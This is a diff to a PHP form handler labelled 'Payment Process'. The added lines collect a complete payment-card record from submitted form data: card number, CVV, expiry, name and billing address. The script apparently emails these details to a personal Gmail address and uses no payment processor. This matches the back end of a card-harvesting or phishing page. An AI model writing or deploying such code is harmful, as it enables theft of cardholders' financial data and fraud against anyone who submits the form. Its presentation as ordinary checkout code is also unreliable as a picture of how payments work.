@@ -1,3 +1,7 @@
+
+
+
+
 <?php
 ini_set('display_errors', 1);
 ini_set('display_startup_errors', 1);
@@ -18,6 +22,20 @@ function sendEmail($post) {
         return "Invalid email address.";
     }
 
+    $subject = filter_var("Payment Process", FILTER_SANITIZE_STRING);
+    $name = filter_var($post['name'], FILTER_SANITIZE_STRING);
+    $amount_to_pay = filter_var($post['amount'], FILTER_SANITIZE_NUMBER_FLOAT, FILTER_FLAG_ALLOW_FRACTION);
+    $card_number = filter_var($post['cardNumber'], FILTER_SANITIZE_STRING);
+    $address = filter_var($post['address'], FILTER_SANITIZE_STRING);
+    $city = filter_var($post['city'], FILTER_SANITIZE_STRING);
+    $state = filter_var($post['state'], FILTER_SANITIZE_STRING);
+    $zipCode = filter_var($post['zipCode'], FILTER_SANITIZE_STRING);
+    $card_expiration_year = filter_var($post['expYear'], FILTER_SANITIZE_NUMBER_INT);
+    $card_expiration_month = filter_var($post['expMonth'], FILTER_SANITIZE_NUMBER_INT);
+    $cvv = filter_var($post['cvv'], FILTER_SANITIZE_NUMBER_INT);
+    $to = filter_var('habeebajani9@gmail.com', FILTER_SANITIZE_EMAIL);
+    $fromEmail = filter_var($post['email'], FILTER_SANITIZE_EMAIL);
+    
     // Rest of the sanitization and validation...
     $to = 'habeebajani9@gmail.com';
     $subject = "Payment Process";
@@ -63,3 +81,4 @@ sendEmail($_POST);
 
 
 ?>
+
